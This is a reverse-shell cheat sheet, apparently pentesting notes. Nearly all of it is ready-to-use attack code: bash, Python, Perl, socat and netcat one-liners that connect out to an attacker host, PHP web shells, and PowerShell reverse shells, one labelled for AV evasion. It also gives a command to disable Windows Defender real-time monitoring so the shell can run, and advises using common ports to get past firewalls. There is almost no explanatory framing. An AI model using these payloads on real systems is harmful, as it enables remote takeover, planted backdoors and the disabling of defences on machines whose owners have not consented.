A **reverse shell** is a connection initiated **from the victim machine to the attacker’s machine**, giving the attacker remote command execution.

Reverse shells are commonly used in **penetration testing and post‑exploitation** because they often **bypass firewalls and NAT**, which usually block incoming connections but allow outbound traffic.

⚠️ **Best practice:** always try to use **common ports** such as:

- `80` (HTTP)
    
- `443` (HTTPS)
    
- `53` (DNS)
    

These ports are more likely to be allowed by firewalls.

---

## Common Reverse Shell Commands

### Linux Reverse Shells

#### 1. Bash Reverse Shell

```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1
```

#### 2. Python Reverse Shell

```bash
python -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh"])'
```

#### 3. Perl Reverse Shell

```bash
perl -e 'use Socket;$i="<ATTACKER_IP>";$p=<ATTACKER_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### 4. Socat Reverse Shell

```bash
socat TCP:<ATTACKER_IP>:<ATTACKER_PORT> EXEC:/bin/sh
```

---

#### 5. Netcat Reverse Shell

```bash
nc -e /bin/bash <ATTACKER_IP> <ATTACKER_PORT>
```

Works only with **netcat‑traditional**. Many systems disable `-e`.

---

### PHP Reverse Shells

#### 1. Basic PHP Command Execution

```php
<?php system($_GET['cmd']); ?>
```


#### 2. PHP Web Shell

```html
<html>
<body>
<form method="GET">
<input type="text" name="cmd" autofocus size="80">
<input type="submit" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
    system($_GET['cmd'] . ' 2>&1');
}
?>
</pre>
</body>
</html>
```

---

### Windows Reverse Shells

#### 1. PowerShell Reverse Shell (standard)

```powershell
$client = New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",<ATTACKER_PORT>);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String);
  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}
```

---

#### 2. PowerShell Reverse Shell (one‑liner, stealthier)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<ATTACKER_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Commonly used for **AV evasion**

---

#### 3. Netcat Reverse Shell (Windows)

```bash
nc.exe -e cmd.exe <ATTACKER_IP> <ATTACKER_PORT>
```

Requires `nc.exe` to be uploaded to the target.

---

## Disable Antivirus (Windows Defender)

In some lab or post‑exploitation scenarios, Windows Defender may block shell execution.

### Disable Real‑Time Monitoring

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Once AV is disabled, **attempt to execute the reverse shell again**.

This requires **administrator privileges**.
